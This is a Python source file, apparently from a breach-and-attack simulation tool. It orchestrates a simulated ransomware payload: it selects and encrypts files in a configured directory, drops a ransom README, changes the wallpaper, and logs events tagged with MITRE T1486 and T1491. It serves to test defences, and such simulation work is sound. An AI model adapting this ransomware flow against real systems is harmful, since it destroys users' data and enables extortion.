import logging
from pathlib import Path
from typing import Iterable

from agentpluginapi import IAgentEventPublisher
from monkeyevents import DefacementEvent, FileEncryptionEvent
from monkeyevents.tags import DATA_ENCRYPTED_FOR_IMPACT_T1486_TAG, DEFACEMENT_T1491_TAG
from monkeytoolbox import interruptible_function, interruptible_iter
from monkeytypes import AgentID, Event

from .consts import README_FILE_NAME, README_SRC
from .internal_ransomware_options import InternalRansomwareOptions
from .typedef import (
    FileEncryptorCallable,
    FileSelectorCallable,
    ReadmeDropperCallable,
    WallpaperChangerCallable,
)

logger = logging.getLogger(__name__)

RANSOMWARE_PAYLOAD_TAG = "ransomware-payload"
RANSOMWARE_TAGS = frozenset({RANSOMWARE_PAYLOAD_TAG, DATA_ENCRYPTED_FOR_IMPACT_T1486_TAG})
WALLPAPER_UPLOAD_TAGS = frozenset({DEFACEMENT_T1491_TAG})


class Ransomware:
    def __init__(
        self,
        config: InternalRansomwareOptions,
        encrypt_file: FileEncryptorCallable,
        select_files: FileSelectorCallable,
        leave_readme: ReadmeDropperCallable,
        change_wallpaper: WallpaperChangerCallable,
        agent_event_publisher: IAgentEventPublisher,
        agent_id: AgentID,
    ):
        self._config = config

        self._encrypt_file = encrypt_file
        self._select_files = select_files
        self._leave_readme = leave_readme
        self._change_wallpaper = change_wallpaper
        self._agent_event_publisher = agent_event_publisher
        self._agent_id = agent_id

        self._target_directory = self._config.target_directory
        self._readme_file_path = (
            self._target_directory / README_FILE_NAME  # type: ignore
            if self._target_directory
            else None
        )

    def run(self, interrupt: Event):
        if not self._target_directory:
            logger.info("No target directory was supplied, skipping the ransomware payload")
            return

        logger.info("Running ransomware payload")

        if not self._target_directory.exists():
            logger.warning(f"Target directory {self._target_directory} does not exist")
            return

        if not self._target_directory.is_dir():
            logger.warning(f"Target directory {self._target_directory} is not a directory")
            return

        if self._target_directory.is_symlink():
            logger.warning(
                "The ransomware payload will not follow symlinks - skipping "
                f"{self._target_directory}"
            )
            return

        # If a target directory was supplied and exists, then we can encrypt some files in it.
        files_to_encrypt = self._find_files()
        self._encrypt_selected_files(files_to_encrypt, interrupt)

        if self._config.leave_readme:
            self._leave_readme_in_target_directory(interrupt=interrupt)

        if self._config.change_wallpaper:
            self._change_wallpaper_in_target_computer(interrupt=interrupt)

    def _find_files(self) -> Iterable[Path]:
        logger.info(f"Collecting files in {self._target_directory}")
        return self._select_files(self._target_directory)  # type: ignore

    def _encrypt_selected_files(self, files_to_encrypt: Iterable[Path], interrupt: Event):
        logger.info(f"Encrypting files in {self._target_directory}")

        interrupted_message = "Received a stop signal, skipping encryption of remaining files"
        for filepath in interruptible_iter(files_to_encrypt, interrupt, interrupted_message):
            try:
                logger.debug(f"Encrypting {filepath}")

                # Note that encrypting a single file is not interruptible. This is so that we avoid
                # leaving half-encrypted files on the user's system.
                self._encrypt_file(filepath)
                self._publish_file_encryption_event(filepath, True, "")
            except Exception as err:
                logger.warning(f"Error encrypting {filepath}: {err}")
                self._publish_file_encryption_event(filepath, False, str(err))

    def _publish_file_encryption_event(self, filepath: Path, success: bool, error: str):
        file_encryption_event = FileEncryptionEvent(
            source=self._agent_id,
            file_path=filepath,
            success=success,
            error_message=error,
            tags=RANSOMWARE_TAGS,
        )
        self._agent_event_publisher.publish(file_encryption_event)

    def _publish_defacement_event(self, description: str):
        defacement_event = DefacementEvent(
            source=self._agent_id,
            defacement_target=DefacementEvent.DefacementTarget.INTERNAL,
            description=description,
            tags=WALLPAPER_UPLOAD_TAGS,
        )
        self._agent_event_publisher.publish(defacement_event)

    @interruptible_function(msg="Received a stop signal, skipping leave readme")
    def _leave_readme_in_target_directory(self, *, interrupt: Event):
        try:
            self._leave_readme(README_SRC, self._readme_file_path)  # type: ignore
        except Exception as err:
            logger.warning(f"An error occurred while attempting to leave a README.txt file: {err}")

    @interruptible_function(msg="Received a stop signal, skipping changing the wallpaper")
    def _change_wallpaper_in_target_computer(self, *, interrupt: Event):
        try:
            self._change_wallpaper()
            self._publish_defacement_event("Wallpaper changed as part of a ransomware attack")
        except NotImplementedError as err:
            # This is expected on Linux
            logger.debug(err)
        except Exception as err:
            logger.warning(f"An error occurred while attempting to change the Wallpaper: {err}")
